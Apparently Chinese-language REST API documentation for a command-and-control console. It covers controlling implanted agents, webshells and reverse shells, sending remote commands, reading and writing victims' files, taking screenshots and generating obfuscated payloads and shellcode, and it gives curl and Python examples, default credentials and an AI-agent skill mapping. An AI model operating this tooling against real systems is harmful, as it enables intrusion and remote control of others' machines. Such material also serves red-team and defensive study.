# API 文档

C2 控制台所有 REST API 接口的调用说明。包含管理 API、WebSocket 推送、Agent 通信。

> AGI 智能体 skill 描述（function calling 格式）见 [skill.md](skill.md)，每个 skill 映射到本文档中的 REST API。

---

## 端口隔离

| 端口 | 协议 | 用途 | 暴露内容 |
|------|------|------|----------|
| 5000 | HTTP/HTTPS | Web 控制台 | 静态文件 + /api/* 管理 API + /ws WebSocket |
| 18443 | HTTP/HTTPS | Agent 回连 | /agent/* 通信端点 + /deliver/* 投递 |
| 28443 | TCP | Agent TCP 回连 | TCP 协议 Agent 通信 |
| 44330 | TCP | Shell TCP | reverse_tcp shellcode 回连 |

> Web 控制台端口（5000）不暴露 `/agent/*` `/deliver/*`；Agent 回连端口（18443）不暴露管理接口和静态文件。

---

## 鉴权

### Token 获取

```http
POST /api/login
Content-Type: application/json

{
  "username": "admin",
  "password": "admin123"
}
```

**响应**：

```json
{
  "token": "f3cc7a48affa0f34...",
  "username": "admin",
  "role": "admin"
}
```

- Token 有效期 24 小时
- 登录限流：连续失败 5 次锁定 15 分钟（`max_login_attempts` / `login_lock_minutes` 可配置）
- 密码存储：SHA256+salt 哈希（旧明文密码首次登录自动升级）

### Token 使用

所有 `/api/*` 接口（除 `/api/login`）和 `/ws` 均需鉴权，支持两种方式：

| 方式 | 格式 | 适用场景 |
|------|------|----------|
| 请求头 | `Authorization: Bearer <token>` | 推荐（fetch / curl / AGI） |
| Query 参数 | `?token=<token>` | 浏览器下载（window.open） |

**鉴权失败**：HTTP 401，`{"error": "Unauthorized"}`

### 安全机制

#### Origin 验证（防 CSRF）

- 对 `/api/*` 和 `/ws` 路径验证 Origin 头
- 白名单基于 `config.json` 的 `web.host` + `web.port` + `web.protocol`
- 无 Origin 头的请求放行（curl / API 客户端，靠 token 鉴权）
- 有 Origin 头但不匹配白名单 → HTTP 403 `{"error": "Origin not allowed"}`

**config.json 示例**：
```json
{
  "web": {
    "host": "192.168.0.31",
    "port": 5000,
    "protocol": "http"
  }
}
```

允许的 Origin：`http://192.168.0.31:5000`、`http://127.0.0.1:5000`、`http://localhost:5000`

#### CSP 安全头

所有 Web 控制台响应均设置：

| 响应头 | 值 |
|--------|------|
| Content-Security-Policy | `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; connect-src 'self'; font-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'none'`（所有第三方库已本地化，不依赖 CDN） |
| X-Content-Type-Options | nosniff |
| X-Frame-Options | DENY |
| Referrer-Policy | same-origin |
| X-XSS-Protection | 1; mode=block |

---

## 通用响应格式

### 成功

```json
{
  "success": true,
  "data": ...
}
```

> 部分 API（如 `/api/login`、`/api/clients`）直接返回数据，不包裹在 `success`/`data` 中。

### 失败

```json
{
  "error": "错误信息"
}
```

---

## 管理 API

### 1. 认证

#### POST /api/login

登录获取 token。详见上方「Token 获取」。

#### POST /api/user/password

修改当前用户密码。需鉴权。

```json
{
  "old_password": "admin123",
  "new_password": "newpass456"
}
```

---

### 2. 仪表盘

#### GET /api/dashboard/stats

获取仪表盘统计数据。需鉴权。

**响应**：

```json
{
  "total_clients": 5,
  "online_clients": 3,
  "total_tasks": 42,
  "today_tasks": 8,
  "os_stats": { "windows": 3, "linux": 2 }
}
```

---

### 3. 客户端管理

#### GET /api/clients

列出所有客户端。需鉴权。

**Query 参数**：

| 参数 | 说明 |
|------|------|
| group | 按分组过滤 |
| type | 按类型过滤（agent/webshell/shell） |

**响应**：客户端对象数组。

```json
[
  {
    "client_id": "ebf09e65c63c8367",
    "hostname": "DESKTOP-ABC",
    "os": "windows",
    "ip": "192.168.0.9",
    "status": "online",
    "last_seen": "2026-07-13 10:42:05",
    "group_name": "default",
    "client_type": "agent"
  }
]
```

#### GET /api/clients/{client_id}

获取指定客户端详情。需鉴权。

#### POST /api/clients/{client_id}/delete

删除客户端及其所有任务。需鉴权。

---

### 4. 会话管理

#### GET /api/sessions

列出所有会话。需鉴权。

#### POST /api/sessions/batch_kill

批量结束会话。需鉴权。

```json
{
  "session_ids": ["id1", "id2"]
}
```

#### POST /api/sessions/{session_id}/kill

结束指定会话。需鉴权。

#### POST /api/sessions/{session_id}/interact

交互指定会话。需鉴权。

---

### 5. 分组管理

#### GET /api/groups

列出所有分组。需鉴权。

#### POST /api/groups

创建分组。需鉴权。

```json
{
  "name": "web-servers",
  "description": "Web 服务器组"
}
```

#### POST /api/clients/group

设置客户端分组。需鉴权。

```json
{
  "client_ids": ["ebf09e65c63c8367"],
  "group": "web-servers"
}
```

---

### 6. 任务管理

#### POST /api/task/send

下发任务到客户端。需鉴权。

```json
{
  "client_ids": ["ebf09e65c63c8367"],
  "task_type": "cmd",
  "task_data": {
    "cmd": "whoami"
  }
}
```

**task_type 取值**：

| task_type | task_data | 说明 |
|-----------|-----------|------|
| cmd | `{"cmd":"whoami"}` | 执行命令 |
| file_list | `{"path":"C:\\"}` | 列目录 |
| file_view | `{"path":"C:\\test.txt"}` | 读文件 |
| file_save | `{"path":"...","content":"base64"}` | 写文件 |
| file_download | `{"path":"..."}` | 下载文件 |
| file_delete | `{"path":"..."}` | 删除文件 |
| screenshot | `{}` | 截图 |

**响应**：

```json
{
  "task_ids": [208],
  "pushed": true
}
```

#### GET /api/tasks

列出任务。需鉴权。

**Query 参数**：

| 参数 | 说明 |
|------|------|
| client_id | 按客户端过滤 |
| status | 按状态过滤（pending/completed/failed） |

#### GET /api/task/{task_id}

获取任务详情。需鉴权。

**响应**：

```json
{
  "id": 208,
  "client_id": "ebf09e65c63c8367",
  "task_type": "cmd",
  "task_data": "{\"cmd\":\"whoami\"}",
  "status": "completed",
  "result": "desktop-abc\\user",
  "created_at": "2026-07-13 10:42:05",
  "completed_at": "2026-07-13 10:42:06"
}
```

#### POST /api/task/{task_id}/delete

删除任务。需鉴权。

---

### 7. 截图

#### GET /api/screenshot/{client_id}

获取客户端最新截图。需鉴权。返回图片文件。

---

### 8. WebShell 管理

#### POST /api/webshell/add

添加 WebShell。需鉴权。

```json
{
  "url": "http://target/shell.php",
  "enc_algo": "aes-128-cbc",
  "enc_password": "C2DemoKey2024!!!",
  "http_headers": "",
  "timeout": 30,
  "proxy": "",
  "remark": "目标 Web 服务器"
}
```

#### GET /api/webshell/list

列出所有 WebShell。需鉴权。

#### POST /api/webshell/{client_id}/edit

编辑 WebShell 配置。需鉴权。

#### POST /api/webshell/{client_id}/exec

在 WebShell 上执行操作。需鉴权。

```json
{
  "action": "cmd",
  "param": {
    "cmd": "whoami"
  }
}
```

**action 取值**：`cmd` / `file_list` / `file_view` / `file_save` / `file_delete`

---

### 9. Shell 会话管理

#### POST /api/shell/{client_id}/exec

在 Shell 会话中执行命令。需鉴权。

```json
{
  "command": "whoami",
  "timeout": 30
}
```

#### POST /api/shell/{client_id}/input

向 Shell 会话输入数据。需鉴权。

#### POST /api/shell/{client_id}/kill

结束 Shell 会话。需鉴权。

---

### 10. Payload 管理

#### GET /api/payloads

列出所有已生成的 Payload。需鉴权。

#### POST /api/payload/generate

生成 Payload。需鉴权。

```json
{
  "name": "test",
  "os": "windows",
  "arch": "amd64",
  "format": "exe",
  "protocol": "websocket",
  "encryption": "aes-128-cbc",
  "enc_password": "C2DemoKey2024!!!",
  "obf_level": "high"
}
```

**protocol 取值**：`http` / `websocket` / `tcp`

**encryption 取值**：`aes-128-cbc` / `aes-256-cbc` / `chacha20` / `rc4` / `xor` / `none`

**format 取值**：`exe` / `shellcode` / `ps1` / `bat` / `sh` / `py`

#### POST /api/payload/shellcode/generate

生成 Shellcode。需鉴权。

#### POST /api/payload/icon/upload

上传 Payload 图标。需鉴权。`multipart/form-data`。

#### GET /api/payload/download/{filename}

下载 Payload 文件。需鉴权（支持 `?token=` query 参数）。

#### POST /api/payloads/{pid}/delete

删除 Payload。需鉴权。

#### POST /api/payloads/clear

清空所有 Payload。需鉴权。

#### GET /api/cmdgen/templates

获取命令生成模板。需鉴权。

---

### 11. 文件上传

#### POST /api/file/upload

上传文件到服务端。需鉴权。`multipart/form-data`。

#### POST /api/files/upload

同 `/api/file/upload`（别名）。

---

### 12. 日志

#### GET /api/logs

列出日志。需鉴权。

**Query 参数**：

| 参数 | 说明 |
|------|------|
| type | 按类型过滤（login/skill/settings/client/payload/task） |
| keyword | 关键词搜索 |
| page | 页码 |
| page_size | 每页条数 |

#### GET /api/logs/export

导出日志。需鉴权。

#### POST /api/logs/clear

清空日志。需鉴权。

#### POST /api/media/clear

清空媒体文件（截图/录音）。需鉴权。

---

### 13. 配置管理

#### GET /api/settings

获取所有配置。需鉴权。

**响应**：

```json
{
  "listen": {
    "host": "192.168.0.31",
    "port": "5000",
    "protocol": "http",
    "callback_host": "",
    "effective_callback_host": "192.168.0.31",
    "client_listen_port": "18443",
    "agent_protocol": "http",
    "agent_tcp_port": "28443",
    "shell_listen_port": "44330",
    "config_from_file": true
  },
  "encryption": {
    "algorithm": "aes-128-cbc",
    "password": "C2DemoKey2024!!!"
  },
  "client": {
    "heartbeat_interval": 5,
    "task_poll_interval": 3,
    "offline_timeout": 60
  },
  "security": {
    "max_login_attempts": 5,
    "login_lock_minutes": 15
  }
}
```

> `listen.host` / `listen.port` / `listen.protocol` 来自 `config.json` 文件，只读。其余字段存数据库。

#### PUT /api/settings

更新配置。需鉴权。请求体为嵌套 JSON（`listen` / `encryption` / `client` / `limits` / `security` / `webhook`）。

#### POST /api/settings/test

测试配置（如 SSL 证书有效性）。需鉴权。

#### POST /api/settings/reload_config

重新加载 `config.json`。需鉴权。修改 host/port 后需重启服务才能生效，但 Origin 白名单会立即刷新。

---

### 14. 用户管理

#### GET /api/users

列出所有用户。需 admin 角色。

#### POST /api/users

创建用户。需 admin 角色。

```json
{
  "username": "operator1",
  "password": "pass123",
  "role": "admin"
}
```

#### DELETE /api/users/{uid}

删除用户。需 admin 角色。不允许删除内置 admin 和当前登录用户。

---

### 15. Webhook

#### GET /api/settings/webhook

获取 Webhook 配置。需鉴权。

#### POST /api/settings/webhook

设置 Webhook 配置。需鉴权。

```json
{
  "enabled": true,
  "url": "https://hook.example.com/notify",
  "events": "login,client_online,payload,task"
}
```

#### POST /api/settings/webhook/test

测试 Webhook 连通性。需鉴权。

---

### 16. 资源文件

#### GET /api/resource/{path}

获取资源文件（如 WebShell 模板）。需鉴权。

---

## WebSocket

### 连接

```
ws://{host}:{port}/ws?token={token}
```

- 需鉴权（token 作为 query 参数）
- Origin 验证同 API

### 消息格式

服务端推送 JSON 消息：

```json
{
  "event": "client_update",
  "data": {}
}
```

**事件类型**：

| event | 说明 |
|-------|------|
| client_update | 客户端上线/下线/信息更新 |
| task_update | 任务状态变更 |

---

## Agent 通信 API（端口 18443）

Agent 回连端口，仅服务 `/agent/*` 和 `/deliver/*`，不暴露管理接口。

### 加密通信

- HTTP/WebSocket：请求体为纯 base64 编码的密文（`Content-Type: text/plain`）
- TCP：`[4-byte length][binary ciphertext]` 帧
- 加密算法嵌入密文内部，服务端遍历 6 种算法自动识别
- 不使用 JSON 信封，不含明文字段

### 主要端点

| 端点 | 方法 | 说明 |
|------|------|------|
| /agent/heartbeat | POST | 心跳上报 |
| /agent/pull | POST | 拉取任务（HTTP 模式） |
| /agent/result | POST | 上报任务结果 |
| /agent/register | POST | 客户端注册 |
| /ws/agent/{random_hex} | WS | WebSocket 长连接 |
| /deliver/{token} | GET | Payload 投递 URL |

> Agent TCP 端口（28443）使用 raw TCP 协议，非 HTTP。

---

## 调用示例

### curl

```bash
# 登录
TOKEN=$(curl -s -X POST http://192.168.0.31:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq -r '.token')

# 列出客户端
curl -s http://192.168.0.31:5000/api/clients \
  -H "Authorization: Bearer $TOKEN"

# 下发命令
curl -s -X POST http://192.168.0.31:5000/api/task/send \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"client_ids":["ebf09e65c63c8367"],"task_type":"cmd","task_data":{"cmd":"whoami"}}'

# 查询任务结果
curl -s http://192.168.0.31:5000/api/task/208 \
  -H "Authorization: Bearer $TOKEN"

# 调用 Skill API
curl -s -X POST http://192.168.0.31:5000/api/skill/exec_command \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"params":{"client_id":"ebf09e65c63c8367","cmd":"whoami"}}'

# 下载 Payload（token 通过 query 参数）
curl -s -O http://192.168.0.31:5000/api/payload/download/test.exe?token=$TOKEN
```

### Python

```python
import requests

BASE = "http://192.168.0.31:5000"

# 登录
resp = requests.post(f"{BASE}/api/login", json={"username": "admin", "password": "admin123"})
token = resp.json()["token"]
headers = {"Authorization": f"Bearer {token}"}

# 列出客户端
clients = requests.get(f"{BASE}/api/clients", headers=headers).json()
for c in clients:
    print(f"{c['client_id']}  {c['hostname']}  {c['status']}")

# 下发命令
resp = requests.post(f"{BASE}/api/task/send", headers=headers, json={
    "client_ids": [clients[0]["client_id"]],
    "task_type": "cmd",
    "task_data": {"cmd": "whoami"}
})
task_id = resp.json()["task_ids"][0]

# 轮询结果
import time
while True:
    task = requests.get(f"{BASE}/api/task/{task_id}", headers=headers).json()
    if task["status"] in ("completed", "failed"):
        print(task["result"])
        break
    time.sleep(2)
```

---

## 错误码

| HTTP 状态码 | 说明 |
|-------------|------|
| 200 | 成功 |
| 400 | 请求参数错误 |
| 401 | 未认证（token 缺失或过期） |
| 403 | 禁止访问（Origin 不允许 / 权限不足） |
| 404 | 资源不存在 |
| 405 | 方法不允许 |
| 429 | 请求过多（登录限流） |
| 500 | 服务器内部错误 |
